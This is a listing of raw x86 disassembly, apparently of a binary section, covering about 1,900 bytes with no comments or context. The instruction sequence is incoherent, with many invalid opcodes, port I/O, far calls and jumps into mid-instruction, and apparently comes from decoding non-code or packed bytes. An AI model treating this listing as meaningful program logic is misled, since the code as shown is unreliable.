  48acd3:	mov    ds:0x7404c7f6,eax
  48acd8:	and    al,0x45
  48acda:	add    DWORD PTR [esi-0x17eeaccb],esp
  48ace0:	cs mov ah,0x4c
  48ace3:	mov    bh,0xf4
  48ace5:	rcr    BYTE PTR [eax],cl
  48ace7:	fimul  WORD PTR [esi]
  48ace9:	mov    eax,ds:0x182d7de5
  48acee:	and    al,0x80
  48acf0:	xor    al,0xd4
  48acf2:	xchg   esp,eax
  48acf3:	push   0xffffffcb
  48acf5:	outs   dx,BYTE PTR ds:[esi]
  48acf6:	cmp    BYTE PTR [eax],ah
  48acf8:	enter  0x35f0,0xc
  48acfc:	and    eax,0x53c05380
  48ad01:	sub    BYTE PTR [esp+eax*4+0xa46061e],dh
  48ad08:	or     DWORD PTR [edi+esi*8+0x1b],ebx
  48ad0c:	(bad)
  48ad10:	out    dx,al
  48ad11:	jmp    esi
  48ad13:	and    al,0xc5
  48ad15:	cmp    BYTE PTR [esi-0x49],0xf5
  48ad19:	mov    ch,0x8d
  48ad1b:	cmp    cl,BYTE PTR [edi]
  48ad1d:	mov    edi,DWORD PTR [eax-0x67]
  48ad20:	data16 ja 0x48acd8
  48ad23:	mov    cl,0x1
  48ad25:	mov    edi,0x28150afa
  48ad2a:	les    ebx,FWORD PTR ds:0x815043bc
  48ad30:	aam    0x42
  48ad32:	cmp    eax,edx
  48ad34:	xchg   edi,eax
  48ad35:	mov    eax,0x72a784a3
  48ad3a:	or     BYTE PTR [edi+0x52],0xda
  48ad3e:	mov    ds:0xfd527180,al
  48ad43:	sbb    al,0x1a
  48ad45:	mov    eax,0x33534deb
  48ad4a:	inc    esi
  48ad4b:	stos   DWORD PTR es:[edi],eax
  48ad4c:	pop    ss
  48ad4d:	add    eax,0x3811be54
  48ad52:	cld    
  48ad53:	dec    ebp
  48ad54:	push   esi
  48ad55:	call   0xa8cbc020
  48ad5a:	push   0x82180db8
  48ad5f:	int    0x30
  48ad61:	cdq    
  48ad62:	mov    ch,bl
  48ad64:	adc    BYTE PTR [ecx],dh
  48ad66:	push   0x4b
  48ad68:	adc    al,0x12
  48ad6a:	ret    
  48ad6b:	or     BYTE PTR [ecx-0x1867bde3],bl
  48ad71:	adc    ah,ah
  48ad73:	mov    eax,ds:0x7f33024
  48ad78:	adc    BYTE PTR [eax+edx*4+0x61],al
  48ad7c:	ror    BYTE PTR [ecx],0xc2
  48ad7f:	or     al,0x4f
  48ad81:	and    BYTE PTR [esi*4+0x170f9704],bl
  48ad88:	icebp  
  48ad89:	inc    edi
  48ad8a:	test   eax,0x92fe8a12
  48ad8f:	push   ebx
  48ad90:	imul   esp,DWORD PTR [edx+0x1],0x8a514680
  48ad97:	aad    0x12
  48ad99:	sahf   
  48ad9a:	rcl    DWORD PTR [ecx-0x6c],cl
  48ad9d:	add    BYTE PTR [eax+0x423d49],dl
  48ada3:	arpl   WORD PTR [edi],cx
  48ada5:	jge    0x48ae1e
  48ada7:	cld    
  48ada8:	pop    ecx
  48ada9:	(bad)  
  48adaa:	nop
  48adab:	sbb    esi,esp
  48adad:	fild   WORD PTR [eax]
  48adaf:	je     0x48ae2a
  48adb1:	jg     0x48ae22
  48adb3:	inc    ebx
  48adb4:	shl    dh,1
  48adb6:	stos   BYTE PTR es:[edi],al
  48adb7:	les    edx,FWORD PTR [ecx]
  48adb9:	inc    eax
  48adba:	je     0x48ae07
  48adbc:	and    al,0x6
  48adbe:	push   0xa
  48adc0:	sbb    DWORD PTR ds:0x74687197,edx
  48adc6:	(bad)  
  48adc7:	fmul   st,st(6)
  48adc9:	sbb    eax,0x4c82d81b
  48adce:	jnp    0x48adbb
  48add0:	adc    ebp,DWORD PTR [ecx]
  48add2:	or     eax,0xef99a25
  48add7:	jns    0x48ae3d
  48add9:	push   cs
  48adda:	sbb    al,0xcb
  48addc:	or     BYTE PTR [ecx+0x8],ah
  48addf:	call   0x9d7:0x361ee4b6
  48ade6:	adc    eax,0x680d8d64
  48adeb:	adc    DWORD PTR [ecx],eax
  48aded:	loopne 0x48ae44
  48adef:	jp     0x48add5
  48adf1:	addr16 fs inc ecx
  48adf4:	inc    esp
  48adf5:	cmp    DWORD PTR [eax-0x30],0xffffffc6
  48adf9:	inc    eax
  48adfa:	iret   
  48adfb:	ins    BYTE PTR es:[edi],dx
  48adfc:	mov    ds:0x398e46ea,al
  48ae01:	ror    BYTE PTR [ebp+0x11],1
  48ae04:	sub    DWORD PTR [edx],esp
  48ae06:	and    BYTE PTR [ebp+0x2fa096a4],dh
  48ae0c:	jnp    0x48ae8b
  48ae0e:	and    al,BYTE PTR [edx-0x31]
  48ae11:	xchg   edx,eax
  48ae12:	pop    ebp
  48ae13:	das    
  48ae14:	loopne 0x48ae48
  48ae16:	bnd jge 0x48ae4f
  48ae19:	jg     0x48ae0b
  48ae1b:	sbb    esp,esp
  48ae1d:	hlt    
  48ae1e:	ss inc esp
  48ae20:	aaa    
  48ae21:	call   0x8d036cee
  48ae26:	sbb    DWORD PTR [edi+0x7b90fd2f],esp
  48ae2c:	inc    eax
  48ae2d:	add    DWORD PTR [esi*2-0x27cba418],ebp
  48ae34:	dec    eax
  48ae35:	cld    
  48ae36:	cs mov cl,0xc7
  48ae39:	icebp  
  48ae3a:	(bad)  
  48ae3b:	cmp    al,0xf8
  48ae3d:	pushf  
  48ae3e:	add    al,0x6
  48ae40:	pop    edx
  48ae41:	cmp    eax,eax
  48ae43:	inc    edi
  48ae44:	cdq    
  48ae45:	pop    eax
  48ae46:	inc    eax
  48ae47:	adc    ebx,edi
  48ae49:	in     eax,dx
  48ae4a:	xor    al,0x2c
  48ae4c:	jle    0x48ae60
  48ae4e:	sbb    ah,BYTE PTR [ecx]
  48ae50:	rcl    dl,0xa
  48ae53:	mov    dl,0x53
  48ae55:	aaa    
  48ae56:	jl     0x48ae83
  48ae58:	aas    
  48ae59:	les    edi,FWORD PTR [eax]
  48ae5b:	push   esi
  48ae5c:	sbb    esp,DWORD PTR [edx+0x707884f0]
  48ae62:	dec    esp
  48ae63:	jl     0x48aeba
  48ae65:	ds cmp al,0x58
  48ae68:	push   esp
  48ae69:	xchg   ebx,eax
  48ae6a:	test   DWORD PTR [edi-0x3cfc40db],edi
  48ae70:	pop    esp
  48ae71:	xchg   esp,eax
  48ae72:	jp     0x48ae2b
  48ae74:	dec    esp
  48ae75:	sub    eax,0x96656345
  48ae7a:	mov    WORD PTR [ebx+0x67d269ac],es
  48ae80:	ret    
  48ae81:	cmp    dh,BYTE PTR [ebp+0x9de2623]
  48ae87:	xchg   edi,eax
  48ae88:	mov    bh,0x1
  48ae8a:	gs je  0x48aeb9
  48ae8d:	lock mov cl,0xc0
  48ae90:	add    eax,DWORD PTR [edx+0x34]
  48ae93:	cmp    DWORD PTR [edi+edx*1+0x2],0xf
  48ae98:	sub    esp,esi
  48ae9a:	xor    dl,dl
  48ae9c:	push   ss
  48ae9d:	mov    dl,0x2f
  48ae9f:	cld    
  48aea0:	jmp    0x48aec0
  48aea2:	push   edi
  48aea3:	sub    DWORD PTR [eax],ebx
  48aea5:	push   ss
  48aea6:	cwde   
  48aea7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48aea8:	dec    ebx
  48aea9:	sbb    eax,0x612071fc
  48aeae:	mov    cl,0x6c
  48aeb0:	test   al,0x0
  48aeb3:	push   ecx
  48aeb4:	int3   
  48aeb5:	sahf   
  48aeb6:	jns    0x48aeb0
  48aeb8:	shr    DWORD PTR [eax],0xff
  48aebb:	or     edx,DWORD PTR [ecx-0x28]
  48aebe:	mov    gs,WORD PTR [edi-0x4b]
  48aec1:	and    eax,0xafb879bb
  48aec6:	out    dx,al
  48aec7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48aec8:	add    BYTE PTR [ebx],bl
  48aeca:	inc    esi
  48aecb:	cmp    DWORD PTR [ebp+0x31080fb8],ebp
  48aed1:	mov    al,0x95
  48aed3:	adc    BYTE PTR [ecx],bl
  48aed5:	dec    ecx
  48aed6:	nop
  48aed7:	xor    bl,BYTE PTR ds:0xf013792f
  48aedd:	jmp    0x48af03
  48aedf:	or     DWORD PTR [edi],0x5b12ed83
  48aee5:	dec    ebx
  48aee6:	adc    eax,0x8295b850
  48aeeb:	or     eax,0x41bc83df
  48aef0:	lock or esi,esp
  48aef3:	inc    ebp
  48aef4:	cwde   
  48aef5:	and    DWORD PTR [ecx],edi
  48aef7:	sub    ah,cl
  48aef9:	pop    edx
  48aefa:	add    DWORD PTR [ebx+0x49],ebp
  48aefd:	outs   dx,DWORD PTR ds:[esi]
  48aefe:	ret    
  48aeff:	xor    ebx,eax
  48af01:	jge    0x48af3a
  48af03:	pop    ss
  48af04:	push   eax
  48af05:	push   ebx
  48af06:	inc    eax
  48af07:	adc    ecx,DWORD PTR [edx+0x7ec78f40]
  48af0d:	xchg   edi,eax
  48af0e:	cmp    DWORD PTR [eax-0xf],ecx
  48af11:	push   eax
  48af12:	fsubr  DWORD PTR [ebx-0x30]
  48af15:	hlt    
  48af16:	sub    dh,ah
  48af18:	pusha  
  48af19:	int    0xc4
  48af1b:	add    eax,0xb4d799e3
  48af20:	or     dh,dl
  48af22:	xchg   esi,eax
  48af23:	in     al,dx
  48af24:	out    dx,eax
  48af25:	(bad)  
  48af26:	adc    al,0x5e
  48af28:	mov    ah,0x4a
  48af2a:	ret    
  48af2b:	jo     0x48af06
  48af2d:	fadd   st,st(3)
  48af2f:	push   0x768a9f8
  48af34:	or     edx,ebx
  48af36:	and    DWORD PTR [esp+esi*4-0x1],esi
  48af3a:	cdq    
  48af3b:	add    al,0x41
  48af3d:	outs   dx,BYTE PTR ds:[esi]
  48af3e:	sbb    al,BYTE PTR [ebx+0x18]
  48af41:	popf   
  48af42:	mov    ebp,0xca1e1112
  48af47:	pop    di
  48af49:	push   eax
  48af4a:	or     eax,0x7c201b53
  48af4f:	fwait
  48af50:	fwait
  48af51:	dec    ebp
  48af52:	or     dh,BYTE PTR [ecx-0xc]
  48af55:	sub    edx,esi
  48af57:	sub    ecx,DWORD PTR [ebx+0x7f24cb95]
  48af5d:	push   eax
  48af5e:	add    edx,esi
  48af60:	inc    edx
  48af61:	push   edx
  48af62:	sub    al,0xf8
  48af64:	pop    ecx
  48af65:	dec    esp
  48af66:	fs pmulhuw mm6,mm0
  48af6a:	sub    edx,ebx
  48af6c:	rol    DWORD PTR [edx-0x2b],cl
  48af6f:	add    BYTE PTR [edi+0x62],ch
  48af72:	push   0xca5b4af
  48af77:	out    dx,eax
  48af78:	sub    DWORD PTR [edx],esp
  48af7a:	xor    ecx,DWORD PTR [edi-0x56ea185b]
  48af80:	and    eax,0x2d28177c
  48af85:	and    al,0xbe
  48af87:	lea    esi,[eax+0x61]
  48af8a:	xor    BYTE PTR [eax+0x17],al
  48af8d:	sub    BYTE PTR [ebp+ebx*2+0x3c0d8a85],ah
  48af94:	mov    cl,0x4c
  48af96:	cmc    
  48af97:	sub    edx,DWORD PTR [ecx-0x10]
  48af9a:	fimul  WORD PTR [edx+0x14]
  48af9d:	and    DWORD PTR [eax],0xffffffc5
  48afa0:	cmp    ebp,DWORD PTR ds:0xada3abd0
  48afa6:	or     al,0x2f
  48afa8:	sbb    BYTE PTR [edi+0x3],bl
  48afab:	mov    dh,0xdf
  48afad:	xchg   BYTE PTR [ebp+0x17337b45],dh
  48afb3:	iret   
  48afb4:	hlt    
  48afb5:	cdq    
  48afb6:	fmul   DWORD PTR [eax-0xb30c4d3]
  48afbc:	rcl    ah,0x46
  48afbf:	sbb    esi,esp
  48afc1:	pop    edi
  48afc2:	into   
  48afc3:	hlt    
  48afc4:	sub    eax,0x8ca91178
  48afc9:	(bad)  
  48afca:	add    ecx,ecx
  48afcc:	fs push edi
  48afce:	dec    ecx
  48afcf:	call   0x5cf3:0xf0a4f321
  48afd6:	dec    ebp
  48afd7:	outs   dx,DWORD PTR ds:[esi]
  48afd8:	mov    ds:0xf848056b,eax
  48afdd:	or     esi,eax
  48afdf:	pop    ebp
  48afe0:	jns    0x48b002
  48afe2:	stos   BYTE PTR es:[edi],al
  48afe3:	sbb    DWORD PTR [eax],esi
  48afe5:	xor    eax,0x16d7543
  48afea:	cs mov cl,0x6d
  48afed:	sbb    BYTE PTR [edi+0x45],dl
  48aff0:	xor    bh,BYTE PTR ds:0x6fbee557
  48aff6:	leave  
  48aff7:	lock or esi,esp
  48affa:	ror    DWORD PTR [edx+eax*1+0xd],1
  48affe:	add    DWORD PTR [ebx],esp
  48b000:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48b001:	loopne 0x48afff
  48b003:	add    ah,BYTE PTR [ecx]
  48b005:	sar    BYTE PTR [ebp-0x7a],0xa0
  48b009:	repnz (bad) 
  48b00b:	ds (bad) 
  48b00d:	pop    ss
  48b00e:	fild   QWORD PTR [edx+0xf]
  48b011:	push   cs
  48b012:	fs push es
  48b014:	nop
  48b015:	push   ecx
  48b016:	add    dh,0x68
  48b019:	sbb    eax,edi
  48b01b:	mov    al,ds:0xa5867b64
  48b020:	or     dh,BYTE PTR [ebx-0x2f]
  48b023:	fdiv   DWORD PTR [ebp-0x1688b373]
  48b029:	add    BYTE PTR [ecx+0xd],0xd3
  48b02d:	clc    
  48b02e:	loopne 0x48b05b
  48b030:	jne    0x48b052
  48b032:	dec    eax
  48b033:	shl    DWORD PTR [ebx+0x7a7709d0],0x60
  48b03a:	xor    eax,0x776ff360
  48b03f:	sbb    BYTE PTR [esi],dh
  48b041:	add    al,0xc3
  48b043:	jge    0x48b0b3
  48b045:	aaa    
  48b046:	fistp  WORD PTR gs:[esi]
  48b049:	dec    edx
  48b04a:	push   ds
  48b04b:	push   esp
  48b04c:	push   edx
  48b04d:	sahf   
  48b04e:	add    ch,BYTE PTR [ecx]
  48b050:	loopne 0x48afd6
  48b052:	mov    esp,0x25eb708b
  48b057:	fwait
  48b058:	sbb    al,0x4c
  48b05a:	add    al,0x6c
  48b05c:	sub    ebp,eax
  48b05e:	sub    eax,0x1e107597
  48b063:	dec    ecx
  48b064:	in     al,0xe4
  48b066:	sub    BYTE PTR [edi],0xbd
  48b069:	test   eax,0x1f387509
  48b06e:	mov    WORD PTR ss:[edx-0x173cfd20],ds
  48b075:	adc    BYTE PTR [esi+esi*1+0x7c],bh
  48b079:	dec    esi
  48b07a:	iret   
  48b07b:	push   ax
  48b07d:	inc    ebp
  48b07e:	pusha  
  48b07f:	cmp    WORD PTR [ebx+eiz*1+0x74],0xf
  48b085:	retf   
  48b086:	inc    edx
  48b087:	push   ecx
  48b088:	pushf  
  48b089:	call   FWORD PTR [edi]
  48b08b:	add    BYTE PTR ds:0xd1c9b4b,0x1
  48b092:	push   ds
  48b093:	or     BYTE PTR [ecx-0x3d252cf4],al
  48b099:	dec    eax
  48b09a:	pushf  
  48b09b:	(bad)  
  48b09c:	dec    ebp
  48b09d:	loopne 0x48b0d0
  48b09f:	or     al,0xd
  48b0a1:	xchg   edx,eax
  48b0a2:	bound  eax,QWORD PTR [esi]
  48b0a4:	mov    BYTE PTR [ecx],dl
  48b0a6:	push   ds
  48b0a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48b0a8:	fisttp DWORD PTR [edx-0x7dc56feb]
  48b0ae:	add    ah,BYTE PTR [eax+eiz*8-0x28ff7ce8]
  48b0b5:	xchg   ecx,eax
  48b0b6:	add    BYTE PTR [esi+0xd9c71ad],ah
  48b0bc:	or     al,0x8
  48b0be:	add    DWORD PTR [esi+0x37b00a4b],ebx
  48b0c4:	sub    BYTE PTR [eax],dh
  48b0c6:	enter  0xcbfe,0xa3
  48b0ca:	lahf   
  48b0cb:	cmp    DWORD PTR [ebp-0x50],edx
  48b0ce:	sub    eax,DWORD PTR [edx-0x58]
  48b0d1:	jmp    0x6e4a16c2
  48b0d6:	add    BYTE PTR [ebx+eax*8-0x6ca7d53d],ch
  48b0dd:	repz repnz sub eax,DWORD PTR ds:0xc50c828
  48b0e5:	and    al,BYTE PTR ds:0xb160a319
  48b0eb:	punpckhdq mm0,QWORD PTR [ecx]
  48b0ee:	cmp    DWORD PTR [bp+0x42a2],ebp
  48b0f3:	add    eax,0x60580a25
  48b0f8:	mov    ax,0x470c
  48b0fc:	test   DWORD PTR [eax+0x55],ebx
  48b0ff:	xor    DWORD PTR [eax+ebp*8+0x3e],ecx
  48b103:	and    eax,0x17c36dd0
  48b108:	lods   al,BYTE PTR ds:[esi]
  48b109:	mov    bl,BYTE PTR ds:0x8a024ae8
  48b10f:	(bad)
  48b113:	call   0xc79c:0xd5404f42
  48b11a:	in     al,0x21
  48b11c:	nop
  48b11d:	xor    DWORD PTR [edi+0x7e],esp
  48b120:	sbb    DWORD PTR [ecx+edx*1-0x57],eax
  48b124:	adc    DWORD PTR [ecx],ecx
  48b126:	iret   
  48b127:	jb     0x48b13d
  48b129:	and    BYTE PTR [edi+0x1522bf4f],al
  48b12f:	adc    BYTE PTR [ebx],ah
  48b131:	push   esi
  48b132:	jne    0x48b151
  48b134:	mov    esp,DWORD PTR [edi+0x38]
  48b137:	adc    DWORD PTR [esi+ebx*1-0x18],0x22d4f848
  48b13f:	jo     0x48b19b
  48b141:	sub    eax,0x4ffd0fdc
  48b146:	mov    BYTE PTR [ebp-0x14bde4d0],cl
  48b14c:	and    bh,BYTE PTR [ecx-0x74]
  48b14f:	call   0xfbaa9d9
  48b154:	mov    cl,BYTE PTR [ebx]
  48b156:	fs dec eax
  48b158:	mov    ?,WORD PTR [esi+0x23215fac]
  48b15e:	xchg   edi,eax
  48b15f:	clc    
  48b160:	sub    esi,eax
  48b162:	clc    
  48b163:	sub    eax,0x1b
  48b166:	xchg   ecx,eax
  48b167:	inc    edx
  48b168:	cs lock push edi
  48b16b:	dec    eax
  48b16c:	push   cs
  48b16d:	inc    eax
  48b16e:	enter  0xf048,0x48
  48b172:	clc    
  48b173:	xchg   edx,eax
  48b174:	pop    es
  48b175:	enter  0xf0b,0x13
  48b179:	add    bl,BYTE PTR [esi]
  48b17b:	sbb    al,0x95
  48b17d:	mov    esp,0x4e1f170a
  48b182:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48b183:	cli    
  48b184:	push   0xc22b3195
  48b189:	imul   edi,eax,0xc02c23c4
  48b18f:	arpl   WORD PTR [esi-0x6d],dx
  48b192:	add    DWORD PTR [ebp-0x56],edx
  48b195:	bound  ebx,QWORD PTR [edi+0x5b]
  48b198:	inc    ecx
  48b199:	and    ebx,esi
  48b19b:	sbb    BYTE PTR ss:[edi+0x45],dl
  48b19f:	pop    edi
  48b1a0:	push   esp
  48b1a1:	push   ds
  48b1a2:	adc    al,0x72
  48b1a4:	sbb    esi,eax
  48b1a6:	dec    eax
  48b1a7:	call   0x9089345d
  48b1ac:	test   eax,0x1a00f200
  48b1b1:	pop    edi
  48b1b2:	fsub   DWORD PTR [edx]
  48b1b4:	pop    eax
  48b1b5:	mov    al,0x42
  48b1b7:	or     al,0xa4
  48b1b9:	or     DWORD PTR [ebp-0x72fb3637],eax
  48b1bf:	(bad)  
  48b1c0:	and    bl,BYTE PTR [ecx]
  48b1c2:	daa    
  48b1c3:	pop    es
  48b1c4:	ror    DWORD PTR [eax-0x1faaa183],0x50
  48b1cb:	adc    DWORD PTR [ecx],0x27
  48b1ce:	fs loopne 0x48b1e1
  48b1d1:	mov    dh,0xe1
  48b1d3:	and    esp,ebp
  48b1d5:	cmp    edi,DWORD PTR [eax]
  48b1d7:	pusha  
  48b1d8:	inc    esp
  48b1d9:	stos   DWORD PTR es:[edi],eax
  48b1da:	das    
  48b1db:	xor    DWORD PTR [edi],ebp
  48b1dd:	loopne 0x48b188
  48b1df:	adc    DWORD PTR [esi+0x4],eax
  48b1e2:	shl    DWORD PTR ss:[esi-0x7c37ee54],cl
  48b1e9:	pop    esi
  48b1eb:	and    dl,BYTE PTR [eax+eiz*4-0x67a1adcd]
  48b1f2:	loopne 0x48b1c1
  48b1f4:	add    BYTE PTR [eax],dh
  48b1f6:	mov    bl,0x77
  48b1f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48b1f9:	add    al,0x63
  48b1fb:	adc    al,0xd0
  48b1fd:	dec    esi
  48b1fe:	inc    ebx
  48b1ff:	fwait
  48b200:	and    edx,DWORD PTR [esp+ecx*1]
  48b203:	shl    dh,0x38
  48b206:	adc    al,ch
  48b208:	add    BYTE PTR [eax],dl
  48b20a:	mov    bl,0xd7
  48b20c:	sub    cl,BYTE PTR [edx+0x43777148]
  48b212:	rol    DWORD PTR [edx],1
  48b214:	push   cs
  48b215:	fwait
  48b216:	mov    ds:0x410a7e39,eax
  48b21b:	fimul  WORD PTR [esi-0x64c6127b]
  48b221:	jae    0x48b228
  48b223:	jl     0x48b1b4
  48b225:	xchg   esi,eax
  48b226:	jo     0x48b1f0
  48b228:	add    DWORD PTR [ebp-0x21],edi
  48b22b:	outs   dx,BYTE PTR ds:[esi]
  48b22c:	je     0x48b204
  48b22e:	or     DWORD PTR [eax-0x2fa1977a],ebx
  48b234:	ins    BYTE PTR es:[edi],dx
  48b235:	push   es
  48b236:	sbb    al,0x99
  48b238:	or     ax,0xc09a
  48b23c:	pop    ecx
  48b23d:	adc    al,0x9c
  48b23f:	call   0xc869:0x1eb30e0a
  48b246:	mov    bh,0x3f
  48b248:	mov    ah,BYTE PTR [eax+edx*2]
  48b24b:	dec    edx
  48b24c:	xlat   BYTE PTR ds:[ebx]
  48b24d:	fisub  DWORD PTR [esi]
  48b24f:	repz fsubr DWORD PTR [esp+eiz*2]
  48b253:	jecxz  0x48b28a
  48b255:	daa    
  48b256:	iret   
  48b257:	push   edi
  48b258:	je     0x48b29c
  48b25a:	push   cs
  48b25b:	pop    ds
  48b25c:	or     DWORD PTR [ecx+0x2],esp
  48b25f:	push   ebp
  48b260:	pop    ebp
  48b261:	pop    edx
  48b262:	ins    DWORD PTR es:[edi],dx
  48b263:	cmp    ch,BYTE PTR [ebx-0x2d]
  48b266:	inc    esi
  48b267:	push   ebp
  48b268:	sbb    DWORD PTR [ebp+edi*8+0x222eb98],0xb
  48b270:	xor    ebx,0x991515db
  48b276:	clc    
  48b277:	in     eax,0x6f
  48b279:	jle    0x48b27f
  48b27b:	add    BYTE PTR [eax+0x4],ch
  48b27e:	or     DWORD PTR [eax-0x4f4c97a7],edx
  48b284:	es out 0x4a,eax
  48b287:	push   eax
  48b288:	fs int 0x2
  48b28b:	jae    0x48b2cd
  48b28d:	mov    dl,0x64
  48b28f:	xor    al,0x7a
  48b291:	jl     0x48b286
  48b293:	movq   mm4,QWORD PTR [ecx]
  48b296:	dec    eax
  48b297:	in     eax,0x5a
  48b299:	jl     0x48b286
  48b29b:	or     al,0x6d
  48b29d:	xchg   edi,eax
  48b29e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48b29f:	sbb    BYTE PTR [ecx+0x3c],al
  48b2a2:	out    0x18,al
  48b2a4:	ss pop ss
  48b2a6:	or     BYTE PTR [esi+0x5b],al
  48b2a9:	scas   eax,DWORD PTR es:[edi]
  48b2aa:	lods   al,BYTE PTR ds:[esi]
  48b2ab:	mov    DWORD PTR [ebp-0x17758510],0x8db9540b
  48b2b5:	pop    ss
  48b2b6:	dec    eax
  48b2b7:	daa    
  48b2b8:	seto   dh
  48b2bb:	sub    DWORD PTR [edi+eiz*4],ebx
  48b2be:	pop    eax
  48b2bf:	push   edx
  48b2c0:	xor    edi,DWORD PTR [ecx-0x6b]
  48b2c3:	fimul  WORD PTR [edx+0x2d2db81b]
  48b2c9:	int    0x8
  48b2cb:	dec    eax
  48b2cc:	xlat   BYTE PTR ds:[ebx]
  48b2cd:	adc    edx,eax
  48b2cf:	pop    es
  48b2d0:	mov    al,0xde
  48b2d2:	fsubr  st(1),st
  48b2d4:	add    dh,BYTE PTR [eax]
  48b2d6:	cmp    cl,cl
  48b2d8:	cld    
  48b2d9:	sub    al,0xf8
  48b2db:	push   cs
  48b2dc:	add    DWORD PTR [esi+ebx*2+0x18],ecx
  48b2e0:	outs   dx,BYTE PTR ds:[esi]
  48b2e1:	es xor dl,0xe0
  48b2e5:	or     DWORD PTR [edx],0x58
  48b2e8:	mov    cl,0xb
  48b2ea:	mov    bl,0x1
  48b2ec:	cmp    BYTE PTR [edx],al
  48b2ee:	xchg   edx,eax
  48b2ef:	fnstenv [ebx-0x5f08c3ec]
  48b2f5:	lds    ecx,FWORD PTR [ebx+0xd]
  48b2f8:	aas    
  48b2f9:	adc    ebp,eax
  48b2fb:	hlt    
  48b2fc:	call   0x324e8f4f
  48b301:	mov    edx,0x16652688
  48b306:	cwde   
  48b307:	out    0x41,al
  48b309:	ret    0x2935
  48b30c:	adc    ah,bh
  48b30e:	pusha  
  48b30f:	add    al,0x5c
  48b311:	sbb    al,0x62
  48b313:	inc    DWORD PTR [edx+0x65]
  48b316:	pop    es
  48b317:	add    DWORD PTR [edx+0x404c9685],ecx
  48b31d:	call   esi
  48b31f:	mov    ds:0x166e8593,al
  48b324:	push   ds
  48b325:	ret    
  48b326:	xor    al,0x5
  48b328:	xchg   esi,eax
  48b329:	out    0x44,eax
  48b32b:	adc    eax,0xaa9f0b1c
  48b330:	push   es
  48b331:	in     al,dx
  48b332:	test   DWORD PTR [esi-0x31b1c815],edx
  48b338:	es cmc 
  48b33a:	out    dx,al
  48b33b:	test   BYTE PTR [ecx-0x66e5f622],bl
  48b341:	gs push es
  48b343:	mov    eax,0xb5aba35
  48b348:	sbb    DWORD PTR [edi+0x56ef9602],esi
  48b34e:	or     ecx,ebp
  48b350:	stc    
  48b351:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48b352:	ds jl  0x48b397
  48b355:	mov    WORD PTR [ebp+0x13b4b606],gs
  48b35b:	or     BYTE PTR [esi+0x49],dl
  48b35e:	popa   
  48b35f:	rol    DWORD PTR [ebx],1
  48b361:	xchg   esi,eax
  48b362:	mov    cl,0xac
  48b364:	and    eax,0x10c42708
  48b369:	lock imul eax,DWORD PTR [esi+0x5694db3],0xffffff8a
  48b371:	pop    esi
  48b372:	pusha  
  48b373:	inc    eax
  48b374:	mov    ch,0xd3
  48b376:	fs (bad) 
  48b378:	div    BYTE PTR [edi+0x48]
  48b37b:	sbb    dh,BYTE PTR [ecx-0x41e17ed0]
  48b381:	mov    BYTE PTR [edi],0xdc
  48b384:	xor    al,0xf1
  48b386:	fmul   DWORD PTR [ebx]
  48b388:	loop   0x48b3e1
  48b38a:	xor    BYTE PTR [edi],ch
  48b38c:	or     ebx,DWORD PTR [ecx]
  48b38e:	xor    al,0x3c
  48b390:	sbb    ebp,DWORD PTR [ecx-0x80]
  48b393:	add    eax,0x4070d986
  48b398:	push   es
  48b399:	rcr    BYTE PTR ss:[ebx],0xe0
  48b39d:	and    BYTE PTR [esi+0xc],ah
  48b3a0:	push   es
  48b3a1:	add    al,0xf0
  48b3a3:	xchg   BYTE PTR [ebx-0x1f5fc9cc],dh
  48b3a9:	and    ch,0x1b
  48b3ac:	push   edi
  48b3ad:	xchg   BYTE PTR [eax+0x78ec5bf],al
  48b3b3:	push   ebp
  48b3b4:	inc    ebx
  48b3b5:	jle    0x48b3ef
  48b3b7:	pop    es
  48b3b8:	inc    BYTE PTR [ecx]
  48b3ba:	add    ah,dh
  48b3bc:	sub    bl,BYTE PTR [edx]
  48b3be:	pop    edi
  48b3bf:	retf   
  48b3c0:	mov    edi,0xaffc84a2
  48b3c5:	(bad)  
  48b3c6:	stc    
  48b3c7:	gs imul edi,eax,0xcf00a4ae
  48b3ce:	mov    ds:0x2de45406,eax
  48b3d3:	jne    0x48b3fb
  48b3d5:	fadd   QWORD PTR [ebx]
  48b3d7:	cmp    BYTE PTR ds:0x4c2f023,ah
  48b3dd:	mov    esi,0xc7ac3d40
  48b3e2:	inc    edi
  48b3e3:	xchg   BYTE PTR [eax+0x32],cl
  48b3e6:	loop   0x48b3bb
  48b3e8:	adc    al,0xd6
  48b3ea:	dec    eax
  48b3eb:	xlat   BYTE PTR ds:[ebx]
  48b3ec:	mov    al,ds:0x7f229186
  48b3f1:	xor    BYTE PTR [eax-0x11],bh
  48b3f4:	in     eax,dx
  48b3f5:	xchg   ebp,eax
  48b3f6:	fst    QWORD PTR [ebx]
  48b3f8:	lea    edx,[edi]
  48b3fa:	xor    edi,eax
  48b3fc:	inc    esi
  48b3fd:	ret    
  48b3fe:	dec    ebx
  48b3ff:	mov    esp,0xef017610
  48b404:	out    dx,eax
  48b405:	cmp    BYTE PTR [edi],bh
  48b407:	fimul  DWORD PTR [eax+0x24]
  48b40a:	mov    ds:0x89402c7a,eax
  48b40f:	or     BYTE PTR [edx+eiz*4+0x6425c688],bh
  48b416:	xchg   esi,eax
  48b417:	inc    edx
  48b418:	mov    eax,ds:0x1542dfe4
  48b41d:	fldpi  
  48b41f:	aam    0xa6
  48b421:	dec    BYTE PTR [edi]
  48b423:	mov    dl,BYTE PTR [eax+0x3f]
  48b426:	cmp    dl,BYTE PTR [ebx+0x3f]
  48b429:	xchg   DWORD PTR [edi],edx
  48b42b:	or     al,0x48
  48b42d:	adc    ebx,ebx
  48b42f:	dec    edx
  48b430:	xor    bl,cl
  48b432:	pop    edi
  48b433:	pop    DWORD PTR [edi]
  48b435:	and    eax,0x38f9ea6b
  48b43a:	mov    al,0x88
  48b43c:	or     ch,al
  48b43e:	and    BYTE PTR [esi-0x7c],ch
  48b441:	mov    al,0x74
  48b443:	daa    
  48b444:	push   eax
  48b445:	add    dh,BYTE PTR [ebp+0x21]
  48b448:	xor    cl,BYTE PTR [esp+eax*4]
  48b44b:	int3   
  48b44c:	sbb    DWORD PTR [edx+esi*2-0x27e1df10],esp
  48b453:	or     BYTE PTR [esi+0x50],al
